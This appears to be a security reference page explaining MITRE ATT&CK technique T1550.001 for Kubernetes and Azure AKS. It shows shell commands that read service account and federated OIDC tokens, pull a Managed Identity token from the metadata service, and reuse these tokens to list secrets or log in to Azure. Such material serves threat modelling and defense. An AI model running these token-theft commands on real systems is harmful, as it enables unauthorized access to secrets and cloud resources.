# Lateral Movement

## **Lateral Movement Techniques in Containerized Environments**

In Kubernetes and container-native infrastructures, adversaries use **Lateral Movement** techniques to **pivot across pods, namespaces, nodes, and cloud services**.\
Rather than exploiting new vulnerabilities, attackers abuse **stolen tokens** or **identity artifacts** to **move stealthily** between resources and escalate access within clusters or cloud environments.

Tokens like Kubernetes Service Account credentials, Azure Managed Identity tokens, or federated OIDC tokens become **weapons of lateral movement** when improperly secured.

***

#### 🔑 Use Alternate Authentication Material → Application Access Token

\| MITRE ID | **T1550.001** |

***

#### **Description**

Steal and reuse application tokens — including Kubernetes service account tokens, Azure Managed Identity tokens, or Azure Workload Identity tokens — to pivot into new Kubernetes resources, namespaces, or connected cloud APIs.

***

#### **Container Example**

* **Steal Kubernetes Service Account Token**:

```bash
bashCopyEditcat /var/run/secrets/kubernetes.io/serviceaccount/token
```

* **Use the stolen token to pivot within Kubernetes**:

```bash
bashCopyEditcurl -k -H "Authorization: Bearer $TOKEN" https://<aks-api-server>/api/v1/secrets
```

✅ **Result**:\
Access Kubernetes secrets, ConfigMaps, pods, or even take over namespaces without triggering MFA or standard login audits.

***

#### **Azure-Specific Example: Lateral Movement in AKS**

* **Harvest an Azure Managed Identity token via Instance Metadata Service (IMDS)**:

```bash
bashCopyEditcurl -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com"
```

* **Use the Azure access token to list Azure resource groups**:

```bash
bashCopyEditcurl -X GET https://management.azure.com/subscriptions/<subscription-id>/resourcegroups?api-version=2021-04-01 \
  -H "Authorization: Bearer $ACCESS_TOKEN"
```

✅ **Result**:\
Move from Kubernetes into broader Azure control planes like storage accounts, Key Vaults, resource groups, or VMs.

***

#### **Azure Workload Identity Example**

* **Steal a federated OIDC token inside AKS**:

```bash
bashCopyEditcat /var/run/secrets/azure/tokens/azure-identity-token
```

* **Exchange the federated token for Azure access**:

```bash
bashCopyEditaz login --service-principal --username <client-id> --federated-token <stolen-token> --tenant <tenant-id>
```

✅ **Result**:\
Authenticate into Azure using the stolen identity, escalate permissions, and persist across cloud services.

***

## 📊 **Summary Table**

| Technique/Subtechnique   | MITRE ID  | Container Example                                                          |
| ------------------------ | --------- | -------------------------------------------------------------------------- |
| Application Access Token | T1550.001 | Steal Kubernetes tokens or Azure Managed Identity tokens to move laterally |

***

## 🎯 **Final Summary**

**Lateral Movement using Alternate Authentication Material** lets attackers **expand their foothold invisibly**.\
By stealing tokens instead of hacking passwords, adversaries **leap across namespaces, clusters, and cloud tenants** without triggering alarms.

